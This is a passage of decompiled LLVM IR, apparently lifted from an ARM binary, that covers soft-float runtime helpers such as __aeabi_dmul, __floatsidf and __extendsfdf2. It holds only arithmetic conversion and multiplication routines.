  br i1 %v7_17764, label %dec_label_pc_17768, label %dec_label_pc_1777c

dec_label_pc_17768:                               ; preds = %dec_label_pc_17760
  %v1_1776c = sub i32 32, %v5_17754
  %v6_17770 = shl i32 %v0_17774, %v5_17754
  store i32 %v6_17770, i32* @r1, align 4
  %v6_17774 = lshr i32 %v0_17774, %v1_1776c
  br label %.thread31

dec_label_pc_1777c:                               ; preds = %dec_label_pc_17760
  %v8_17760 = icmp eq i32 %v2_17760, 0
  %v4_17760 = add i32 %v5_17754, 2147483616
  %v5_17760 = and i32 %v2_17760, %v4_17760
  br label %dec_label_pc_17780

dec_label_pc_17780:                               ; preds = %bb43, %dec_label_pc_1777c
  %v1_1778c.in = phi i32 [ %v2_17758, %bb43 ], [ %v2_17760, %dec_label_pc_1777c ]
  %v6_1778c = phi i32 [ %v2_17758, %bb43 ], [ %v5_17754, %dec_label_pc_1777c ]
  %v2_1778c.in = phi i32 [ %v5_17758, %bb43 ], [ %v5_17760, %dec_label_pc_1777c ]
  %v0_1778c = phi i1 [ %v8_17758, %bb43 ], [ %v8_17760, %dec_label_pc_1777c ]
  %v1_1778c = icmp slt i32 %v1_1778c.in, 0
  %v2_1778c = icmp slt i32 %v2_1778c.in, 0
  %v3_17780 = xor i1 %v2_1778c, %v1_1778c
  %v4_17780 = or i1 %v0_1778c, %v3_17780
  br i1 %v4_17780, label %bb44, label %bb45

bb44:                                             ; preds = %dec_label_pc_17780
  %v6_17780 = sub i32 32, %v6_1778c
  store i32 %v6_17780, i32* @ip, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_17780, %bb44
  %v6_17784 = shl i32 %v0_17774, %v6_1778c
  br i1 %v4_17780, label %bb46, label %.thread31

bb46:                                             ; preds = %bb45
  %v6_17788 = load i32, i32* @r1, align 4
  %v7_17788 = load i32, i32* @ip, align 4
  %v12_17788 = lshr i32 %v6_17788, %v7_17788
  %v13_17788 = or i32 %v12_17788, %v6_17784
  %v11_1778c = shl i32 %v6_17788, %v6_1778c
  store i32 %v11_1778c, i32* @r1, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb45, %dec_label_pc_17768, %bb46
  %v1_177d8 = phi i32 [ %v6_17774, %dec_label_pc_17768 ], [ %v13_17788, %bb46 ], [ %v6_17784, %bb45 ]
  %v0_17790 = load i32, i32* @r4, align 4
  %v2_17790 = sub i32 %v0_17790, %v5_17754
  %v5_17794 = icmp slt i32 %v0_17790, %v5_17754
  br i1 %v5_17794, label %bb48, label %bb47

bb47:                                             ; preds = %.thread31
  %v10_17794 = mul i32 %v2_17790, 1048576
  %v11_17794 = add i32 %v10_17794, %v1_177d8
  %v7_17798 = load i32, i32* @r5, align 4
  %v8_17798 = or i32 %v7_17798, %v11_17794
  ret i32 %v8_17798

bb48:                                             ; preds = %.thread31
  %v2_177a4 = sub i32 -32, %v2_17790
  %v6_177a8 = icmp sgt i32 %v2_17790, -32
  br i1 %v6_177a8, label %dec_label_pc_177ac, label %dec_label_pc_177e4

dec_label_pc_177ac:                               ; preds = %bb48
  %v1_177ac = add i32 %v2_177a4, 12
  %v8_177b0 = icmp sgt i32 %v1_177ac, 0
  br i1 %v8_177b0, label %dec_label_pc_177cc, label %dec_label_pc_177b4

dec_label_pc_177b4:                               ; preds = %dec_label_pc_177ac
  %v1_177b4 = add i32 %v2_177a4, 32
  %v0_177c4 = load i32, i32* @r5, align 4
  %v7_177c4 = lshr i32 %v1_177d8, %v1_177b4
  %v8_177c4 = or i32 %v0_177c4, %v7_177c4
  ret i32 %v8_177c4

dec_label_pc_177cc:                               ; preds = %dec_label_pc_177ac
  %v0_177dc = load i32, i32* @r5, align 4
  ret i32 %v0_177dc

dec_label_pc_177e4:                               ; preds = %bb48
  %v0_177e8 = load i32, i32* @r5, align 4
  ret i32 %v0_177e8

; uselistorder directives
  uselistorder i32 %v2_17790, { 1, 0, 2 }
  uselistorder i32 %v1_177d8, { 1, 0 }
  uselistorder i32 %v6_17784, { 1, 0 }
  uselistorder i32 %v2_17758, { 1, 0, 2 }
  uselistorder i32 %v5_17754, { 5, 4, 6, 2, 7, 1, 3, 8, 9, 0, 11, 10 }
  uselistorder i32 %v4_17740, { 1, 0 }
  uselistorder i32 %v1_17740, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17734, { 1, 0 }
  uselistorder i32 %v1_17734, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17728, { 1, 0 }
  uselistorder i32 %v0_17774, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 -12, { 1, 2, 14, 15, 3, 17, 18, 4, 19, 20, 16, 13, 12, 11, 10, 9, 21, 22, 23, 5, 6, 7, 24, 8, 25, 26, 28, 29, 30, 27, 0 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 13, 2, 4, 5, 3, 14, 7, 6, 12, 8, 15, 17, 16, 18, 0, 9, 1, 10, 19, 11 }
  uselistorder i32 15, { 2, 3, 1, 6, 4, 8, 0, 5, 7 }
  uselistorder i32 -8, { 7, 14, 15, 16, 17, 18, 19, 13, 12, 5, 11, 10, 9, 8, 20, 21, 22, 23, 6, 24, 25, 3, 0, 29, 26, 27, 28, 2, 30, 31, 4, 1 }
  uselistorder i32 128, { 11, 12, 6, 7, 9, 5, 19, 0, 21, 22, 1, 20, 8, 15, 16, 2, 3, 10, 17, 18, 4, 14, 13 }
  uselistorder i32 255, { 7, 8, 11, 1, 10, 0, 9, 4, 2, 3, 5, 6 }
  uselistorder i32 -16, { 3, 8, 9, 10, 11, 12, 13, 14, 15, 16, 7, 6, 5, 1, 17, 18, 19, 20, 21, 22, 4, 2, 0, 23 }
  uselistorder i32 65535, { 2, 3, 1, 4, 0 }
  uselistorder i32 52, { 0, 4, 2, 6, 3, 1, 7, 5 }
  uselistorder i32 20, { 3, 29, 30, 31, 32, 0, 21, 35, 4, 36, 1, 5, 33, 6, 22, 23, 12, 28, 13, 7, 2, 8, 24, 25, 26, 27, 14, 34, 15, 16, 17, 18, 19, 20, 9, 10, 11 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_17780, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_177f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_177f0:
  store i32 %arg4, i32* @r3, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_177f0 = load i32, i32* @r4, align 4
  %v2_177f0 = icmp eq i32 %v0_177f0, 0
  %v1_177f4 = xor i32 %arg3, 1048576
  store i32 %v1_177f4, i32* @r2, align 4
  br i1 %v2_177f0, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_177f0
  %v2_177f8 = xor i32 %arg1, 1048576
  store i32 %v2_177f8, i32* @r0, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_177f0
  %v1_17800 = load i32, i32* @r5, align 4
  %v2_17800 = add i32 %v1_17800, -1
  store i32 %v2_17800, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_17804 = call i32 @function_1765c()
  %v0_17808 = load i32, i32* @r4, align 4
  %v0_17808.off = add i32 %v0_17808, 4194303
  %tmp = icmp ult i32 %v0_17808.off, 2097152
  %v1_17884 = load i32, i32* @r5, align 4
  %v1_17884.off = add i32 %v1_17884, 4194303
  %tmp45 = icmp ult i32 %v1_17884.off, 2097152
  br i1 %tmp, label %.thread11, label %bb33

bb33:                                             ; preds = %bb
  br i1 %tmp45, label %bb40, label %dec_label_pc_17814

dec_label_pc_17814:                               ; preds = %bb33
  %v4_17814 = icmp eq i32 %v1_17884, %v0_17808
  %v1_17818 = load i32, i32* @r1, align 4
  br i1 %v4_17814, label %bb34, label %dec_label_pc_17820

bb34:                                             ; preds = %dec_label_pc_17814
  %v2_17818 = load i32, i32* @r3, align 4
  %v5_17818 = icmp eq i32 %v2_17818, %v1_17818
  br i1 %v5_17818, label %dec_label_pc_17830, label %dec_label_pc_17820

dec_label_pc_17820:                               ; preds = %dec_label_pc_17814, %bb34
  %v2_17820 = or i32 %v1_17818, %v0_17808
  %v4_17820 = icmp eq i32 %v2_17820, 0
  br i1 %v4_17820, label %bb35, label %.thread6

bb35:                                             ; preds = %dec_label_pc_17820
  %v1_17824 = load i32, i32* @r2, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_17820, %bb35
  %v11_1782c = phi i32 [ %v0_17804, %dec_label_pc_17820 ], [ %v1_17824, %bb35 ]
  ret i32 %v11_1782c

dec_label_pc_17830:                               ; preds = %bb34
  %v1_17830 = load i32, i32* @r2, align 4
  %v4_17830 = icmp eq i32 %v1_17830, %v0_17804
  br i1 %v4_17830, label %.thread8, label %bb36

bb36:                                             ; preds = %dec_label_pc_17830
  ret i32 0

.thread8:                                         ; preds = %dec_label_pc_17830
  %tmp46 = icmp ult i32 %v0_17808, 2097152
  br i1 %tmp46, label %dec_label_pc_17848, label %dec_label_pc_17858

dec_label_pc_17848:                               ; preds = %.thread8
  %v1_17848 = icmp slt i32 %v1_17818, 0
  %v3_1784c = mul i32 %v0_17804, 2
  %v4_1784c = zext i1 %v1_17848 to i32
  %v5_1784c = or i32 %v4_1784c, %v3_1784c
  %v9_1784c = icmp ule i32 %v5_1784c, %v0_17804
  %v10_1784c = icmp ult i32 %v3_1784c, %v0_17804
  %v11_1784c = select i1 %v1_17848, i1 %v9_1784c, i1 %v10_1784c
  br i1 %v11_1784c, label %bb37, label %bb38

bb37:                                             ; preds = %dec_label_pc_17848
  %v2_17850 = or i32 %v5_1784c, -2147483648
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_17848, %bb37
  %v11_17854 = phi i32 [ %v5_1784c, %dec_label_pc_17848 ], [ %v2_17850, %bb37 ]
  ret i32 %v11_17854

dec_label_pc_17858:                               ; preds = %.thread8
  %v2_17858 = icmp ugt i32 %v0_17808, -4194305
  br i1 %v2_17858, label %.thread9, label %bb39

bb39:                                             ; preds = %dec_label_pc_17858
  %v2_1785c = add i32 %v0_17804, 1048576
  ret i32 %v2_1785c

.thread9:                                         ; preds = %dec_label_pc_17858
  %v1_17864 = and i32 %v0_17804, -2147483648
  %v1_1786c = or i32 %v1_17864, 2146435072
  ret i32 %v1_1786c

.thread11:                                        ; preds = %bb
  br i1 %tmp45, label %.thread11..thread13_crit_edge, label %.thread14

.thread11..thread13_crit_edge:                    ; preds = %.thread11
  %v0_17890.pre = load i32, i32* @r1, align 4
  br label %.thread13

.thread14:                                        ; preds = %.thread11
  store i32 %v0_17804, i32* @r2, align 4
  br label %bb41

bb40:                                             ; preds = %bb33
  %v1_1787c = load i32, i32* @r2, align 4
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread14
  %v1_1789027 = phi i32 [ %v0_17804, %.thread14 ], [ %v1_1787c, %bb40 ]
  %v1_1788c.in = phi i32* [ @r1, %.thread14 ], [ @r3, %bb40 ]
  %v1_1788c = load i32, i32* %v1_1788c.in, align 4
  store i32 %v1_1788c, i32* @r3, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11..thread13_crit_edge, %bb41
  %v1_1789c = phi i32 [ %v0_17804, %.thread11..thread13_crit_edge ], [ %v1_1789027, %bb41 ]
  %v0_17890 = phi i32 [ %v0_17890.pre, %.thread11..thread13_crit_edge ], [ %v1_1788c, %bb41 ]
  %v4_17890 = mul i32 %v1_1789c, 4096
  %v5_17890 = or i32 %v4_17890, %v0_17890
  %v7_17890 = icmp eq i32 %v5_17890, 0
  br i1 %v7_17890, label %bb42, label %.thread17

bb42:                                             ; preds = %.thread13
  %v1_17894 = load i32, i32* @r3, align 4
  %v2_17894 = load i32, i32* @r2, align 4
  %v5_17894 = mul i32 %v2_17894, 4096
  %v6_17894 = or i32 %v5_17894, %v1_17894
  %v8_17894 = icmp eq i32 %v6_17894, 0
  br i1 %v8_17894, label %bb43, label %.thread17

bb43:                                             ; preds = %bb42
  %v5_17898 = icmp eq i32 %v2_17894, %v1_1789c
  br i1 %v5_17898, label %bb44, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb42, %bb43
  %v2_1789c = or i32 %v1_1789c, 524288
  br label %bb44

bb44:                                             ; preds = %bb43, %.thread17
  %v11_178a0 = phi i32 [ %v1_1789c, %bb43 ], [ %v2_1789c, %.thread17 ]
  ret i32 %v11_178a0

; uselistorder directives
  uselistorder i32 %v1_1789c, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1788c, { 1, 0 }
  uselistorder i1 %v1_17848, { 1, 0 }
  uselistorder i32 %v1_17818, { 2, 1, 0 }
  uselistorder i32 %v0_17808, { 4, 1, 3, 0, 2 }
  uselistorder i32 %v0_17804, { 3, 4, 2, 5, 6, 7, 8, 1, 0, 9 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_17820, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  %v2_178a4 = icmp eq i32 %arg1, 0
  br i1 %v2_178a4, label %bb, label %.thread

bb:                                               ; preds = %entry
  ret i32 0

.thread:                                          ; preds = %entry
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r1, align 4
  %v1_178c8 = call i32 @function_1770c(i32 0)
  ret i32 %v1_178c8
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  %v2_178cc = icmp eq i32 %arg1, 0
  br i1 %v2_178cc, label %bb, label %.thread

bb:                                               ; preds = %entry
  ret i32 0

.thread:                                          ; preds = %entry
  store i32 1074, i32* @r4, align 4
  %v1_178e4 = and i32 %arg1, -2147483648
  store i32 %v1_178e4, i32* @r5, align 4
  %v2_178e4 = icmp eq i32 %v1_178e4, 0
  br i1 %v2_178e4, label %bb5, label %bb4

bb4:                                              ; preds = %.thread
  %v2_178e8 = sub i32 0, %arg1
  br label %bb5

bb5:                                              ; preds = %.thread, %bb4
  %v0_178ec = phi i32 [ %arg1, %.thread ], [ %v2_178e8, %bb4 ]
  store i32 %v0_178ec, i32* @r1, align 4
  %v1_178f4 = call i32 @function_1770c(i32 0)
  ret i32 %v1_178f4

; uselistorder directives
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %v2_178f8 = mul i32 %arg1, 2
  %v4_178f8 = icmp eq i32 %v2_178f8, 0
  %v1_178fc = and i32 %v2_178f8, 4
  %v2_178fc = icmp ne i32 %v1_178fc, 0
  %v3_178fc = sdiv i32 %v2_178f8, 8
  %v3_17900 = zext i1 %v2_178fc to i32
  %v6_17900 = zext i32 %v3_178fc to i64
  %v7_17900 = sub nsw i32 33, %v3_178fc
  %v8_17900 = zext i32 %v7_17900 to i64
  %v9_17900 = shl i64 %v6_17900, %v8_17900
  %v10_17900 = sub nsw i32 32, %v3_178fc
  %v11_17900 = shl i32 %v3_17900, %v10_17900
  %v12_17900 = zext i32 %v11_17900 to i64
  %v14_17900 = or i64 %v12_17900, %v9_17900
  %v15_17900 = trunc i64 %v14_17900 to i32
  %v3_17904 = mul i32 %arg1, 536870912
  store i32 %v3_17904, i32* @r1, align 4
  br i1 %v4_178f8, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v4_17908 = icmp ult i32 %v2_178f8, 16777216
  br i1 %v4_17908, label %bb12, label %bb9

bb9:                                              ; preds = %bb
  %v4_1791c18 = icmp ugt i32 %v2_178f8, -16777217
  br i1 %v4_1791c18, label %bb11.thread, label %bb10

bb11.thread:                                      ; preds = %bb9
  br label %.thread3

bb10:                                             ; preds = %bb9
  %v2_179106 = xor i32 %v15_17900, 939524096
  ret i32 %v2_179106

.thread2:                                         ; preds = %entry
  br label %.thread3

.thread3:                                         ; preds = %bb11.thread, %.thread2
  ret i32 %v15_17900

bb12:                                             ; preds = %bb
  store i32 896, i32* @r4, align 4
  %v1_1792c = and i32 %v15_17900, -2147483648
  store i32 %v1_1792c, i32* @r5, align 4
  %tmp = bitcast i32 %v15_17900 to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_17930 = bitcast float %tmp19 to i32
  %v1_17934 = call i32 @function_1770c(i32 %v1_17930)
  ret i32 %v1_17934

; uselistorder directives
  uselistorder i32 %v15_17900, { 0, 2, 1, 3 }
  uselistorder i32 %v3_178fc, { 1, 2, 0 }
  uselistorder i32 %v2_178f8, { 1, 0, 4, 3, 2 }
  uselistorder i32 (i32)* @function_1770c, { 2, 0, 1 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_17938 = or i32 %arg2, %arg1
  %v4_17938 = icmp eq i32 %v2_17938, 0
  br i1 %v4_17938, label %bb, label %bb3

bb:                                               ; preds = %entry
  ret i32 %arg1

bb3:                                              ; preds = %entry
  store i32 0, i32* @r5, align 4
  %v0_17948 = call i32 @function_17968()
  ret i32 %v0_17948

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1794c = or i32 %arg2, %arg1
  %v4_1794c = icmp eq i32 %v2_1794c, 0
  br i1 %v4_1794c, label %bb, label %bb3

bb:                                               ; preds = %entry
  ret i32 %arg1

bb3:                                              ; preds = %entry
  %v1_1795c = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_1795c, i32 ptrtoint (i32* @global_var_17968.657 to i32))
  %v1_17960 = sub i32 0, %arg1
  ret i32 %v1_17960

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @function_17968() local_unnamed_addr {
dec_label_pc_17968:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_17970 = load i32, i32* @r0, align 4
  %v0_17974 = load i32, i32* @r1, align 4
  store i32 %v0_17974, i32* %r0.global-to-local, align 4
  store i32 %v0_17970, i32* %r1.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17974, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_176b0.655 to i32))
  %tmp6 = icmp ult i32 %v0_17974, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_17968
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_17968, %bb
  %v1_17994 = phi i32 [ 3, %dec_label_pc_17968 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_17974, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_17994 = add nuw nsw i32 %v1_17994, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_17998 = phi i32 [ %v1_17994, %bb3 ], [ %v2_17994, %bb4 ]
  %not. = icmp slt i32 %v0_17974, 0
  %v4_17998 = zext i1 %not. to i32
  %v5_17998 = add nsw i32 %v0_17998, %v4_17998
  %v1_1799c = sub nsw i32 32, %v5_17998
  %v0_179a0 = load i32, i32* %r1.global-to-local, align 4
  %v6_179a0 = shl i32 %v0_179a0, %v1_1799c
  store i32 %v6_179a0, i32* @ip, align 4
  %v6_179a4 = lshr i32 %v0_179a0, %v5_17998
  %v1_179a8 = load i32, i32* %r0.global-to-local, align 4
  %v7_179a8 = shl i32 %v1_179a8, %v1_1799c
  %v8_179a8 = or i32 %v7_179a8, %v6_179a4
  store i32 %v8_179a8, i32* %r1.global-to-local, align 4
  %v6_179ac = lshr i32 %v1_179a8, %v5_17998
  store i32 %v6_179ac, i32* %r0.global-to-local, align 4
  %v0_179b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_179b0 = add i32 %v0_179b0, %v5_17998
  store i32 %v2_179b0, i32* @r4, align 4
  %v4_179b4 = sext i32 %v8_179a8 to i64
  %v5_179b4 = call i32 @function_176b0(i32 %v6_179ac, i64 %v4_179b4, i32 %v5_17998, i32 %v1_1799c)
  store i32 %v5_179b4, i32* %r0.global-to-local, align 4
  ret i32 %v5_179b4

; uselistorder directives
  uselistorder i32 %v5_17998, { 2, 0, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32 6, { 1, 22, 23, 24, 15, 16, 2, 19, 20, 3, 4, 26, 5, 6, 21, 0, 7, 8, 9, 10, 11, 17, 18, 12, 14, 13, 25 }
  uselistorder i32 3, { 60, 17, 45, 71, 46, 27, 28, 73, 22, 74, 75, 23, 76, 77, 13, 67, 0, 30, 29, 47, 3, 2, 1, 4, 78, 31, 5, 6, 14, 7, 8, 48, 49, 85, 50, 51, 52, 53, 54, 55, 68, 11, 32, 69, 12, 61, 86, 18, 62, 82, 83, 24, 81, 15, 79, 16, 70, 9, 10, 56, 25, 57, 26, 84, 58, 20, 33, 63, 64, 21, 65, 34, 66, 59, 37, 36, 35, 44, 72, 38, 80, 39, 40, 41, 42, 43, 19 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_179b8 = load i32, i32* @r4, align 4
  store i32 %v3_179b8, i32* %stack_var_-16, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_179c4 = udiv i32 %arg1, 1048576
  %v5_179c4 = urem i32 %v4_179c4, 2048
  store i32 %v5_179c4, i32* %r4.global-to-local, align 4
  %v6_179c4 = icmp eq i32 %v5_179c4, 0
  br i1 %v6_179c4, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v5_179c8 = udiv i32 %arg3, 1048576
  %v6_179c8 = urem i32 %v5_179c8, 2048
  store i32 %v6_179c8, i32* @r5, align 4
  %v7_179c8 = icmp eq i32 %v6_179c8, 0
  br i1 %v7_179c8, label %.thread1, label %bb41

bb41:                                             ; preds = %bb
  %v5_179cc = icmp eq i32 %v5_179c4, 2047
  br i1 %v5_179cc, label %.thread1, label %bb42

bb42:                                             ; preds = %bb41
  %v5_179d0 = icmp eq i32 %v6_179c8, 2047
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb41, %bb42
  %v0_179d4 = phi i1 [ true, %bb ], [ true, %bb41 ], [ %v5_179d0, %bb42 ], [ true, %entry ]
  store i32 96728, i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_179d4, i32 ptrtoint (i32* @global_var_17c54.658 to i32))
  %v0_179d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_179d8 = load i32, i32* @r5, align 4
  %v2_179d8 = add i32 %v1_179d8, %v0_179d8
  store i32 %v2_179d8, i32* %r4.global-to-local, align 4
  %v2_179dc = xor i32 %arg3, %arg1
  %v1_179e0 = load i32, i32* %ip.global-to-local, align 4
  %tmp = mul i32 %v1_179e0, -2097152
  %v5_179e0 = add i32 %tmp, -1
  %v6_179e0 = and i32 %v5_179e0, %arg1
  store i32 %v6_179e0, i32* %r0.global-to-local, align 4
  %v6_179e4 = and i32 %v5_179e0, %arg3
  store i32 %v6_179e4, i32* %r2.global-to-local, align 4
  %v4_179e8 = mul i32 %arg1, 4096
  %v5_179e8 = or i32 %v4_179e8, %arg2
  %v7_179e8 = icmp eq i32 %v5_179e8, 0
  br i1 %v7_179e8, label %.thread, label %bb43

.thread:                                          ; preds = %.thread1
  %v1_179f017 = or i32 %v6_179e0, 1048576
  store i32 %v1_179f017, i32* %r0.global-to-local, align 4
  %v1_179f418 = or i32 %v6_179e4, 1048576
  store i32 %v1_179f418, i32* %r2.global-to-local, align 4
  %v1_17b2c19 = and i32 %v2_179dc, -2147483648
  br label %dec_label_pc_17b2c

bb43:                                             ; preds = %.thread1
  %v5_179ec = mul i32 %arg3, 4096
  %v6_179ec = or i32 %v5_179ec, %arg4
  %v8_179ec = icmp eq i32 %v6_179ec, 0
  %v1_179f0 = or i32 %v6_179e0, 1048576
  store i32 %v1_179f0, i32* %r0.global-to-local, align 4
  %v1_179f4 = or i32 %v6_179e4, 1048576
  store i32 %v1_179f4, i32* %r2.global-to-local, align 4
  %v1_17b2c = and i32 %v2_179dc, -2147483648
  br i1 %v8_179ec, label %dec_label_pc_17b2c, label %dec_label_pc_179fc

dec_label_pc_179fc:                               ; preds = %bb43
  store i32 %v1_17b2c, i32* %stack_var_-40, align 4
  %v9_17a00 = load i32, i32* @r8, align 4
  %v12_17a00 = load i32, i32* @sb, align 4
  %v3_17a04 = udiv i32 %arg2, 65536
  %v3_17a08 = udiv i32 %arg4, 65536
  store i32 %v3_17a08, i32* %r8.global-to-local, align 4
  %v3_17a0c = udiv i32 %v1_179f0, 65536
  store i32 %v3_17a0c, i32* %sb.global-to-local, align 4
  %v3_17a10 = udiv i32 %v1_179f4, 65536
  %tmp59 = mul i32 %v3_17a04, -65536
  %v5_17a14 = add i32 %tmp59, -1
  %v6_17a14 = and i32 %v5_17a14, %arg2
  store i32 %v6_17a14, i32* %r1.global-to-local, align 4
  %tmp60 = mul i32 %v3_17a08, -65536
  %v5_17a18 = add i32 %tmp60, -1
  %v6_17a18 = and i32 %v5_17a18, %arg4
  %tmp61 = mul i32 %v3_17a0c, -65536
  %v5_17a1c = add i32 %tmp61, -1
  %v6_17a1c = and i32 %v6_179e0, %v5_17a1c
  store i32 %v6_17a1c, i32* %r0.global-to-local, align 4
  %tmp62 = mul i32 %v3_17a10, -65536
  %v5_17a20 = add i32 %tmp62, -1
  %v6_17a20 = and i32 %v6_179e4, %v5_17a20
  store i32 %v6_17a20, i32* %r2.global-to-local, align 4
  %v2_17a24 = mul i32 %v6_17a18, %v6_17a14
  %v2_17a28 = mul i32 %v3_17a08, %v6_17a14
  %v2_17a34 = and i32 %v2_17a28, 32768
  %v3_17a34 = icmp ne i32 %v2_17a34, 0
  %v4_17a34 = udiv i32 %v2_17a28, 65536
  %v7_17a34 = zext i1 %v3_17a34 to i32
  %v2_17a38 = mul i32 %v6_17a18, %v3_17a04
  %tmp53 = add i32 %v2_17a38, %v2_17a28
  %tmp54 = mul i32 %tmp53, 65536
  %v5_17a3c = add i32 %tmp54, %v2_17a24
  store i32 %v5_17a3c, i32* %ip.global-to-local, align 4
  %v2_17a40 = and i32 %v2_17a38, 32768
  %v3_17a40 = icmp ne i32 %v2_17a40, 0
  %v4_17a40 = udiv i32 %v2_17a38, 65536
  %v7_17a40 = zext i1 %v3_17a40 to i32
  %v2_17a44 = mul i32 %v3_17a10, %v6_17a14
  %v2_17a50 = and i32 %v2_17a44, 32768
  %v3_17a50 = icmp ne i32 %v2_17a50, 0
  %v4_17a50 = udiv i32 %v2_17a44, 65536
  %v7_17a50 = zext i1 %v3_17a50 to i32
  %v8_17a50 = add nuw nsw i32 %v7_17a50, %v4_17a50
  %v2_17a54 = mul i32 %v6_17a20, %v3_17a04
  %v2_17a5c = and i32 %v2_17a54, 32768
  %v3_17a5c = icmp ne i32 %v2_17a5c, 0
  %v4_17a5c = udiv i32 %v2_17a54, 65536
  %v6_17a5c = add nuw nsw i32 %v8_17a50, %v4_17a5c
  %v7_17a5c = zext i1 %v3_17a5c to i32
  %v8_17a5c = add nuw nsw i32 %v6_17a5c, %v7_17a5c
  %v2_17a60 = mul i32 %v3_17a08, %v6_17a1c
  %v2_17a68 = and i32 %v2_17a60, 32768
  %v3_17a68 = icmp ne i32 %v2_17a68, 0
  %v4_17a68 = udiv i32 %v2_17a60, 65536
  %v6_17a68 = add nuw nsw i32 %v8_17a5c, %v4_17a68
  %v7_17a68 = zext i1 %v3_17a68 to i32
  %v8_17a68 = add nuw nsw i32 %v6_17a68, %v7_17a68
  %v2_17a6c = mul i32 %v6_17a18, %v3_17a0c
  %v4_17a70 = mul i32 %v2_17a6c, 65536
  %tmp55 = add i32 %v2_17a54, %v2_17a44
  %tmp56 = add i32 %tmp55, %v2_17a60
  %tmp57 = mul i32 %tmp56, 65536
  %v8_17a40 = add nuw nsw i32 %v7_17a34, %v4_17a34
  %v5_17a4c = add nuw nsw i32 %v8_17a40, %v4_17a40
  %v5_17a58 = add nuw nsw i32 %v5_17a4c, %v7_17a40
  %v5_17a64 = add i32 %v5_17a58, %v4_17a70
  %v5_17a70 = add i32 %v5_17a64, %tmp57
  %v2_17a74 = and i32 %v2_17a6c, 32768
  %v3_17a74 = icmp ne i32 %v2_17a74, 0
